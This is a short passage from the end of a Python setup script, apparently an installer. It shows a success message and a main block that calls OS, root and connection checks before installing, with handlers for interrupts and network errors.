    print('everything setup perfectly ✔')
    time.sleep(2)


if __name__ == '__main__':
    try:
        check_os()
        check_root()
        check_connection()
        installer()
        main()
    except KeyboardInterrupt:
        print('\nExit signal received \nexiting ')
        sys.exit()

    except OSError:
        print('\nPlease check your internet connection')
        sys.exit()
